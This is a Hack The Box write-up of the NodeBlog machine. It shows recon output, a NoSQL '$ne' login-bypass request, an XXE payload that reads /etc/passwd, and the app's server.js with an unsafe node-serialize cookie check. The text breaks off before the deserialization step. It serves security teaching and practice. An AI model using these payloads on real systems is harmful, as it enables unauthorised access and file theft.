@@ -1,0 +1,605 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: NodeBlog</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#htb-nodeblog">htb-nodeblog</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#uhc">uhc</a> <a class="post-tag" href="/tags#youtube">youtube</a> <a class="post-tag" href="/tags#python">python</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#nodejs">nodejs</a> <a class="post-tag" href="/tags#nosql-injection">nosql-injection</a> <a class="post-tag" href="/tags#payloadsallthethings">payloadsallthethings</a> <a class="post-tag" href="/tags#xxe">xxe</a> <a class="post-tag" href="/tags#node-serialize">node-serialize</a> <a class="post-tag" href="/tags#deserialization">deserialization</a> <a class="post-tag" href="/tags#json-deserialization">json-deserialization</a> <a class="post-tag" href="/tags#mongo">mongo</a> <a class="post-tag" href="/tags#mongodump">mongodump</a> <a class="post-tag" href="/tags#bsondump">bsondump</a> </span><br/><br/>
+<time class="dt-published" datetime="2022-01-10T10:00:00+00:00" itemprop="datePublished">Jan 10, 2022
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2022/01/10/htb-nodeblog.html" style="color: #e6e6e6; text-decoration: none;">HTB: NodeBlog</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/nodeblog-cover.webp" type="image/webp"/>
+<img alt="NodeBlog" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/nodeblog-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:120px;">
+</img></picture>
+<p>This UHC qualifier box was a neat take on some common NodeJS vulnerabilities. First there’s a NoSQL authentication bypass. Then I’ll use XXE in some post upload ability to leak files, including the site source. With that, I’ll spot a deserialization vulnerability which I can abuse to get RCE. I’ll get the user’s password from Mongo via the shell or through the NoSQL injection, and use that to escalate to root. In Beyond Root, a look at characters that broke the deserialization payload, and scripting the NoSQL injection.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/430 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/nodeblog" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">NodeBlog</a> <a href="https://hackthebox.com/machines/nodeblog" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-nodeblog.webp" type="image/webp"/> <img alt="NodeBlog" class="img-av" src="/icons/box-nodeblog.png"/></picture></a><br/><a href="https://hackthebox.com/machines/nodeblog" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right">10 Jan 2022</td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">10 Jan 2022</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Easy">Easy [20]</span></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/3769" rel="noopener" target="_blank"><img alt="ippsec" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/3769" style="display: unset"/><span class="user-text" style="display: none"> ippsec</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> found two open TCP ports, SSH (22) and HTTP (80):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp 10.10.11.139
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-09 13:30 EST
+Nmap scan report for 10.10.11.139
+Host is up (0.10s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+5000/tcp open  upnp
+
+Nmap done: 1 IP address (1 host up) scanned in 8.78 seconds
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,5000 <span class="nt">-sCV</span> <span class="nt">-oA</span> scans/nmap-tcpscripts 10.10.11.139
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-09 13:33 EST
+Nmap scan report for 10.10.11.139
+Host is up (0.092s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+5000/tcp open  http    Node.js (Express middleware)
+|_http-title: Blog
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.49 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="https://packages.ubuntu.com/search?keywords=openssh-server">OpenSSH</a> version, the host is likely running Ubuntu 20.04 Focal. The site is (unsurprisingly based on the box name) running NodeJS.</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The page is a blog about UHC with a single article:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220110115720971.webp" type="image/webp"/>
+<img alt="image-20220110115720971" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220110115720971.png"/>
+</picture>
+<p>Clicking “Read More” leads to <code class="language-plaintext highlighter-rouge">http://10.10.11.139:5000/articles/uhc-qualifiers</code>, which is the full post with some links, all of which lead to publics sites (out of scope):</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220109134724240.webp" type="image/webp"/>
+<img alt="image-20220109134724240" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220109134724240.png"/>
+</picture>
+<p>The “Login” button leads to <code class="language-plaintext highlighter-rouge">/login</code>, which is a login form:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220110115752224.webp" type="image/webp"/>
+<img alt="image-20220110115752224" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220110115752224.png"/>
+</picture>
+<h4 id="tech-stack">Tech Stack</h4>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> identified the site is running NodeJS with Express. The response headers confirm that, but don’t indicate much else:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">Express</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">1891</span>
+<span class="na">ETag</span><span class="p">:</span> <span class="s">W/"763-yBLqx1Bg/Trp0SZ2cyMSGFoH5nU"</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Sun, 09 Jan 2022 22:49:52 GMT</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+</code></pre></div></div>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.10.11.139:5000
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.4.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.11.139:5000
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.4.0
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Cancel Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-green">200</span><span class="go">       28l       59w     1002c http://10.10.11.139:5000/login
+</span><span class="feroxbuster-green">200</span><span class="go">       28l       59w     1002c http://10.10.11.139:5000/Login
+</span><span class="feroxbuster-green">200</span><span class="go">       28l       59w     1002c http://10.10.11.139:5000/LOGIN
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 58s    29999/29999   0s      </span><span class="feroxbuster-green">found</span><span class="go">:3       </span><span class="feroxbuster-red">errors</span><span class="go">:0
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 58s    29999/29999   515/s   http://10.10.11.139:5000
+</span></code></pre></div></div>
+<p>Nothing I don’t already know about.</p>
+<h2 id="shell-as-admin">Shell as admin</h2>
+<h3 id="auth-bypass-via-nosql-injection">Auth Bypass Via NoSQL Injection</h3>
+<p>Some basic SQL injections didn’t do anything, nor did a quick <code class="language-plaintext highlighter-rouge">sqlmap</code> run against the login form.</p>
+<p>Testing for NoSQL injection is a bit trickier than some of the simple checks for SQL injection. PayloadsAllTheThings has a <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#authentication-bypass">good section of payloads</a> for NoSQL auth bypass to keep as a handy reference for the things I’ll show here. Here we want Node to handle the input as a JSON object. The page by default is submitting as a HTML form (this is set by the <code class="language-plaintext highlighter-rouge">Content-Type</code> header in the request):</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/login</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.11.139:5000</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">29</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://10.10.11.139:5000</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://10.10.11.139:5000/login</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+
+user=admin&amp;password=wrongpassword
+</code></pre></div></div>
+<p>In this format, I can try adding changing the data to:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user=admin&amp;password[$ne]=wrongpassword
+</code></pre></div></div>
+<p>If the server interprets that how I want, it would make it look for records where the password was not equal to “wrongpassword”, which would return the admin record.</p>
+<p>I’ll send the login POST request to Burp Repeater and give this a try, but it doesn’t work.</p>
+<p>The other way that data can be sent is as JSON. I’ll change the <code class="language-plaintext highlighter-rouge">Content-Type</code> header, and then convert the body to JSON (first without any injection to make sure the site processed it correctly):</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/login</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.11.139:5000</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">46</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://10.10.11.139:5000</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://10.10.11.139:5000/login</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+
+<span class="p">{</span><span class="nl">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"admin"</span><span class="p">,</span><span class="w"> </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"wrongpassword"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>Sending that does return the “Invalid Password” message, which shows that the username was processed and matched. I’ll replace the string “wrongpassword” with a JSON object that uses the <code class="language-plaintext highlighter-rouge">$ne</code> operator to look for records that have the username admin and don’t have that password:</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"admin"</span><span class="p">,</span><span class="w"> </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nl">"$ne"</span><span class="p">:</span><span class="w"> </span><span class="s2">"wrongpassword"</span><span class="p">}}</span><span class="w">
+</span></code></pre></div></div>
+<p>On sending that, the response comes back with a cookie, which is a good indication I’ve successfully logged in.</p>
+<p>I can grab that cookie and add it to Firefox using the dev tools. Alternatively, I could turn intercept on in Burp, submit the login from Firefore, modify it the same way as I did in Repeater, and then forward it. Either way, I have a logged in session in Firefox:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220110115840824.webp" type="image/webp"/>
+<img alt="image-20220110115840824" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220110115840824.png"/>
+</picture>
+<p>The auth bypass was all I need from this NoSQL injection, but I can also dump out the usernames and passwords from the database. I’ll show this in <a href="#nosql-data-collection">Beyond Root</a>.</p>
+<h3 id="xxe-file-read">XXE File Read</h3>
+<h4 id="site-enumeration">Site Enumeration</h4>
+<p>The logged in site has a few more buttons. “New Article” leads to <code class="language-plaintext highlighter-rouge">/articles/new</code>, which is a form for creating a new article:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220110080833417.webp" type="image/webp"/>
+<img alt="image-20220110080833417" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220110080833417.png"/>
+</picture>
+<p>I tried submitting an article, and it worked:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220110083732854.webp" type="image/webp"/>
+<img alt="image-20220110083732854" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220110083732854.png"/>
+</picture>
+<p>I can edit articles and delete them as well.</p>
+<p>There’s also the “Upload” button. Clicking it pops the file selection interface from my OS. Sending a file returns:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220110084031580.webp" type="image/webp"/>
+<img alt="image-20220110084031580" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220110084031580.png"/>
+</picture>
+<p>Looking at the response, it’s a bit clearer (as Firefox was treating tags as HTML):</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">Express</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">144</span>
+<span class="na">ETag</span><span class="p">:</span> <span class="s">W/"90-v0DoTdXwQk7iInwC6sdbQSWTk3E"</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Mon, 10 Jan 2022 17:49:14 GMT</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+
+Invalid XML Example: <span class="nt">&lt;post&gt;&lt;title&gt;</span>Example Post<span class="nt">&lt;/title&gt;&lt;description&gt;</span>Example Description<span class="nt">&lt;/description&gt;&lt;markdown&gt;</span>Example Markdown<span class="nt">&lt;/markdown&gt;&lt;/post&gt;</span>
+</code></pre></div></div>
+<p>I created a dummy XML file of the format the server sent:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;post&gt;</span>
+        <span class="nt">&lt;title&gt;</span>0xdf's Post<span class="nt">&lt;/title&gt;</span>
+        <span class="nt">&lt;description&gt;</span>A post from 0xdf<span class="nt">&lt;/description&gt;</span>
+        <span class="nt">&lt;markdown&gt;</span>
+## post
+This is a test post.
+        <span class="nt">&lt;/markdown&gt;</span>
+<span class="nt">&lt;/post&gt;</span>
+</code></pre></div></div>
+<p>On uploading that, it leads to <code class="language-plaintext highlighter-rouge">/articles/xml</code>, with what looks like a submission form already filled in:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220110090421985.webp" type="image/webp"/>
+<img alt="image-20220110090421985" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220110090421985.png"/>
+</picture>
+<h4 id="xxe">XXE</h4>
+<p>The site is clearly accepting XML and parsing that into the form to display back to me. This is a classic opportunity for an XML External Entity (XXE) injection - I’ll see if I can get the XML process to process my input in such a way that it handles it as code. It’s a similar class of bug to SSTI (template injection) and even Log4j.</p>
+<p>PayloadsAllTheThings has a lot of <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#exploiting-xxe-to-retrieve-files">example payloads</a> for XXE as well. I’ll grab the first one and try to read <code class="language-plaintext highlighter-rouge">/etc/passwd</code>. I can’t just submit it as is though, I have to work from the template that the site is expecting. I’ll update my XML file to:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE data [
+&lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;</span>
+]&gt;
+<span class="nt">&lt;post&gt;</span>
+        <span class="nt">&lt;title&gt;</span>0xdf's Post<span class="nt">&lt;/title&gt;</span>
+        <span class="nt">&lt;description&gt;</span>Read File<span class="nt">&lt;/description&gt;</span>
+        <span class="nt">&lt;markdown&gt;</span><span class="ni">&amp;file;</span><span class="nt">&lt;/markdown&gt;</span>
+<span class="nt">&lt;/post&gt;</span>
+
+</code></pre></div></div>
+<p>This defines the entity <code class="language-plaintext highlighter-rouge">&amp;file;</code> as the contents of <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, and then references it in the markdown field. When I submit this, it works:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220110123114923.webp" type="image/webp"/>
+<img alt="image-20220110123114923" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220110123114923.png"/>
+</picture>
+<h3 id="find-source-location">Find Source Location</h3>
+<p>After not finding much of interest in various files, I found myself trying to crash the site. Errors in the XML just lead to the example payload. Errors in the urls give simple messages like <code class="language-plaintext highlighter-rouge">Cannot GET /a</code>. One thing that did work was sending busted JSON to to <code class="language-plaintext highlighter-rouge">/login</code>:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/login</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.11.139:5000</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">1</span>
+
+<span class="p">{</span><span class="w">
+</span></code></pre></div></div>
+<p>The response included a stack trace:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220110131328282.webp" type="image/webp"/>
+<img alt="image-20220110131328282" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220110131328282.png"/>
+</picture>
+<p>It seems the source for the webapp is running in <code class="language-plaintext highlighter-rouge">/opt/blog</code>.</p>
+<h3 id="deserialization">Deserialization</h3>
+<h4 id="source-analysis">Source Analysis</h4>
+<p>I’ll find the source for the application at <code class="language-plaintext highlighter-rouge">/opt/blog/server.js</code> (<code class="language-plaintext highlighter-rouge">server.js</code> is a common name for a Node application).</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">mongoose</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">mongoose</span><span class="dl">'</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">Article</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">./models/article</span><span class="dl">'</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">articleRouter</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">./routes/articles</span><span class="dl">'</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">loginRouter</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">./routes/login</span><span class="dl">'</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">serialize</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">node-serialize</span><span class="dl">'</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">methodOverride</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">method-override</span><span class="dl">'</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">fileUpload</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express-fileupload</span><span class="dl">'</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">cookieParser</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">cookie-parser</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">cookie_secret</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">UHC-SecretCookie</span><span class="dl">"</span>
+<span class="c1">//var session = require('express-session');</span>
+<span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nf">express</span><span class="p">()</span>
+
+<span class="nx">mongoose</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="dl">'</span><span class="s1">mongodb://localhost/blog</span><span class="dl">'</span><span class="p">)</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="dl">'</span><span class="s1">view engine</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">ejs</span><span class="dl">'</span><span class="p">)</span>
+<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nf">urlencoded</span><span class="p">({</span> <span class="na">extended</span><span class="p">:</span> <span class="kc">false</span> <span class="p">}))</span>
+<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="nf">methodOverride</span><span class="p">(</span><span class="dl">'</span><span class="s1">_method</span><span class="dl">'</span><span class="p">))</span>
+<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="nf">fileUpload</span><span class="p">())</span>
+<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nf">json</span><span class="p">());</span>
+<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="nf">cookieParser</span><span class="p">());</span>
+<span class="c1">//app.use(session({secret: "UHC-SecretKey-123"}));</span>
+
+<span class="kd">function</span> <span class="nf">authenticated</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if </span><span class="p">(</span><span class="k">typeof</span> <span class="nx">c</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">undefined</span><span class="dl">'</span><span class="p">)</span>
+        <span class="k">return</span> <span class="kc">false</span>
+
+    <span class="nx">c</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">.</span><span class="nf">unserialize</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span>
+
+    <span class="k">if </span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">sign</span> <span class="o">==</span> <span class="p">(</span><span class="nx">crypto</span><span class="p">.</span><span class="nf">createHash</span><span class="p">(</span><span class="dl">'</span><span class="s1">md5</span><span class="dl">'</span><span class="p">).</span><span class="nf">update</span><span class="p">(</span><span class="nx">cookie_secret</span> <span class="o">+</span> <span class="nx">c</span><span class="p">.</span><span class="nx">user</span><span class="p">).</span><span class="nf">digest</span><span class="p">(</span><span class="dl">'</span><span class="s1">hex</span><span class="dl">'</span><span class="p">))</span> <span class="p">){</span>
+        <span class="k">return</span> <span class="kc">true</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="kc">false</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="k">async </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">articles</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">Article</span><span class="p">.</span><span class="nf">find</span><span class="p">().</span><span class="nf">sort</span><span class="p">({</span>
+        <span class="na">createdAt</span><span class="p">:</span> <span class="dl">'</span><span class="s1">desc</span><span class="dl">'</span>
+    <span class="p">})</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">articles/index</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">articles</span><span class="p">:</span> <span class="nx">articles</span><span class="p">,</span> <span class="na">ip</span><span class="p">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">socket</span><span class="p">.</span><span class="nx">remoteAddress</span><span class="p">,</span> <span class="na">authenticated</span><span class="p">:</span> <span class="nf">authenticated</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">auth</span><span class="p">)</span> <span class="p">})</span>
+<span class="p">})</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="dl">'</span><span class="s1">/articles</span><span class="dl">'</span><span class="p">,</span> <span class="nx">articleRouter</span><span class="p">)</span>
+<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="dl">'</span><span class="s1">/login</span><span class="dl">'</span><span class="p">,</span> <span class="nx">loginRouter</span><span class="p">)</span>
+
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="mi">5000</span><span class="p">)</span>
+</code></pre></div></div>
+<p>What jumps out to me is the import of <code class="language-plaintext highlighter-rouge">node-serialize</code>, which implies serialization is in use, which is always a risky path.</p>
+<p>The <code class="language-plaintext highlighter-rouge">unserialize</code> function is being called on <code class="language-plaintext highlighter-rouge">c</code>, which is likely the cookie. Looking at the cookie, it’s clearly URL encoded JSON:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%7B%22user%22%3A%22admin%22%2C%22sign%22%3A%2223e112072945418601deb47d9a6c7de8%22%7D
+</code></pre></div></div>
+<p>This decodes to:</p>
